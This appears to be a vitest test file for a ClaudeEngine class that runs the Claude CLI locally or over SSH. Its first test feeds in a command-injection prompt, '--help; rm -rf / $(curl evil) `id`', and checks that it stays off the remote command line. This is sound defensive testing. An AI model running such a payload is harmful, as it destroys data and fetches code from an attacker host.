import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { EventEmitter } from "node:events";

vi.mock("node:child_process", () => ({
  spawn: vi.fn(),
}));

vi.mock("../../shared/logger.js", () => ({
  logger: { warn: vi.fn(), debug: vi.fn(), info: vi.fn(), error: vi.fn() },
}));

// resolveBin is only used on the local (non-SSH) path; keep it deterministic.
vi.mock("../../shared/resolveBin.js", () => ({
  resolveBin: (bin: string) => `/usr/local/bin/${bin}`,
  formatSpawnError: (label: string, bin: string, err: Error) => `Failed to spawn ${label} (${bin}): ${err.message}`,
}));

import { spawn } from "node:child_process";
import { ClaudeEngine } from "../claude.js";

const mockSpawn = vi.mocked(spawn);

function createMockProcess() {
  const proc = new EventEmitter() as any;
  proc.stdout = new EventEmitter();
  proc.stderr = new EventEmitter();
  proc.stdin = { write: vi.fn(), end: vi.fn(), on: vi.fn() };
  proc.pid = 12345;
  proc.exitCode = null;
  proc.killed = false;
  proc.kill = vi.fn(() => { proc.killed = true; });
  return proc;
}

/** Emit a successful stream-json result and close the process. */
function finishOk(proc: any, result = "done") {
  proc.stdout.emit(
    "data",
    Buffer.from(JSON.stringify({ type: "result", subtype: "success", result, session_id: "sess-1" }) + "\n"),
  );
  proc.exitCode = 0;
  proc.emit("close", 0);
}

describe("ClaudeEngine — SSH remote execution", () => {
  let engine: ClaudeEngine;

  beforeEach(() => {
    engine = new ClaudeEngine();
  });

  afterEach(() => {
    vi.restoreAllMocks();
    mockSpawn.mockReset();
  });

  it("runs claude over ssh and sends the prompt via stdin, never on the command line", async () => {
    const proc = createMockProcess();
    mockSpawn.mockReturnValue(proc as any);

    // A prompt full of shell metacharacters and a flag-shaped token.
    const nastyPrompt = "--help; rm -rf / $(curl evil) `id`";
    const p = engine.run({ prompt: nastyPrompt, cwd: "/tmp", sshHost: "myhost", sessionId: "s1" });

    const [bin, args] = mockSpawn.mock.calls[0] as [string, string[], unknown];
    expect(bin).toBe("ssh");
    expect(args).toContain("-T");
    expect(args).toContain("BatchMode=yes");
    // host is passed after a `--` end-of-options guard
    expect(args[args.indexOf("--") + 1]).toBe("myhost");

    const remoteCmd = args[args.length - 1];
    expect(remoteCmd).toContain("setsid sh -c");
    expect(remoteCmd).toContain("__JINN_REMOTE_PGID__=$$");
    // The untrusted prompt must NOT appear in the remote command line at all.
    expect(remoteCmd).not.toContain("rm -rf");
    expect(remoteCmd).not.toContain("curl evil");

    // Prompt is delivered over stdin instead.
    expect(proc.stdin.write).toHaveBeenCalledWith(nastyPrompt);
    expect(proc.stdin.end).toHaveBeenCalled();

    finishOk(proc);
    await p;
  });

  it("drops local-only flags (--chrome, --mcp-config) on the remote command", async () => {
    const proc = createMockProcess();
    mockSpawn.mockReturnValue(proc as any);

    const p = engine.run({ prompt: "hi", cwd: "/tmp", sshHost: "h", sessionId: "s2", mcpConfigPath: "/local/mcp.json" });

    const args = mockSpawn.mock.calls[0][1] as string[];
    const remoteCmd = args[args.length - 1];
    expect(remoteCmd).not.toContain("--chrome");
    expect(remoteCmd).not.toContain("--mcp-config");
    expect(remoteCmd).not.toContain("/local/mcp.json");

    finishOk(proc);
    await p;
  });

  it("prepends a cd to remoteCwd when provided", async () => {
    const proc = createMockProcess();
    mockSpawn.mockReturnValue(proc as any);

    const p = engine.run({ prompt: "hi", cwd: "/tmp", sshHost: "h", sessionId: "s3", remoteCwd: "/srv/work" });

    const args = mockSpawn.mock.calls[0][1] as string[];
    const remoteCmd = args[args.length - 1];
    expect(remoteCmd).toMatch(/^cd '\/srv\/work' && setsid sh -c/);

    finishOk(proc);
    await p;
  });

  it("kill() terminates the remote process group over a second ssh connection", async () => {
    const runProc = createMockProcess();
    const killProc = createMockProcess();
    mockSpawn.mockReturnValueOnce(runProc as any).mockReturnValueOnce(killProc as any);

    const p = engine.run({ prompt: "long task", cwd: "/tmp", sshHost: "remote1", sessionId: "k1" });

    // Remote supervisor reports its process-group id on stderr.
    runProc.stderr.emit("data", Buffer.from("__JINN_REMOTE_PGID__=4242\n"));

    engine.kill("k1", "User cancelled");

    // Second spawn must be an ssh kill targeting the negative pgid.
    expect(mockSpawn.mock.calls.length).toBeGreaterThanOrEqual(2);
    const [killBin, killArgs] = mockSpawn.mock.calls[1] as [string, string[], unknown];
    expect(killBin).toBe("ssh");
    expect(killArgs).toContain("remote1");
    expect((killArgs as string[]).join(" ")).toContain("kill -s TERM -- -4242");

    // Let the run settle as interrupted.
    runProc.exitCode = 0;
    runProc.emit("close", 0);
    const result = await p;
    expect(result.error).toBe("User cancelled");
  });

  it("defers the remote kill until the pgid marker arrives when kill() races startup", async () => {
    const runProc = createMockProcess();
    const killProc = createMockProcess();
    mockSpawn.mockReturnValueOnce(runProc as any).mockReturnValueOnce(killProc as any);

    const p = engine.run({ prompt: "task", cwd: "/tmp", sshHost: "remote2", sessionId: "race1" });

    // Kill BEFORE the supervisor reported its pgid — no remote kill is possible yet.
    engine.kill("race1", "User cancelled");
    expect(mockSpawn.mock.calls.length).toBe(1);

    // Marker arrives, split across two chunks (chunk-boundary robustness).
    runProc.stderr.emit("data", Buffer.from("__JINN_REMOTE_PGID__=77"));
    runProc.stderr.emit("data", Buffer.from("7\n"));

    // The deferred remote kill must now have fired with the captured pgid.
    expect(mockSpawn.mock.calls.length).toBe(2);
    expect((mockSpawn.mock.calls[1][1] as string[]).join(" ")).toContain("kill -s TERM -- -777");

    runProc.exitCode = 0;
    runProc.emit("close", 0);
    const result = await p;
    expect(result.error).toBe("User cancelled");
  });

  it("strips the pgid marker so it never leaks into reported stderr", async () => {
    const proc = createMockProcess();
    mockSpawn.mockReturnValue(proc as any);

    const p = engine.run({ prompt: "hi", cwd: "/tmp", sshHost: "h", sessionId: "s4" });
    proc.stderr.emit("data", Buffer.from("__JINN_REMOTE_PGID__=99\nreal warning\n"));
    // Non-zero exit surfaces stderr; the marker line must be gone.
    proc.exitCode = 2;
    proc.emit("close", 2);

    const result = await p;
    expect(result.error ?? "").not.toContain("__JINN_REMOTE_PGID__");
  });
});

describe("ClaudeEngine — local execution unchanged", () => {
  let engine: ClaudeEngine;

  beforeEach(() => { engine = new ClaudeEngine(); });
  afterEach(() => { vi.restoreAllMocks(); mockSpawn.mockReset(); });

  it.each([undefined, "resume-fable"])("passes the exact Fable 5.1 model and max effort to fresh and resumed runs (%s)", async (resumeSessionId) => {
    const proc = createMockProcess();
    mockSpawn.mockReturnValue(proc as any);
    const p = engine.run({
      prompt: "hello", cwd: "/tmp", sessionId: "fable", model: "claude-fable-5-1",
      effortLevel: "max", resumeSessionId,
    });
    const args = mockSpawn.mock.calls[0][1] as string[];
    expect(args[args.indexOf("--model") + 1]).toBe("claude-fable-5-1");
    expect(args[args.indexOf("--effort") + 1]).toBe("max");
    if (resumeSessionId) expect(args[args.indexOf("--resume") + 1]).toBe(resumeSessionId);
    finishOk(proc);
    await p;
  });

  it("passes the prompt as an argv element and does not write to stdin", async () => {
    const proc = createMockProcess();
    mockSpawn.mockReturnValue(proc as any);

    const p = engine.run({ prompt: "hello world", cwd: "/tmp", sessionId: "l1" });

    const [bin, args] = mockSpawn.mock.calls[0] as [string, string[], unknown];
    expect(bin).toBe("/usr/local/bin/claude");
    expect(args).toContain("hello world");
    expect(proc.stdin.write).not.toHaveBeenCalled();

    finishOk(proc);
    await p;
  });
});
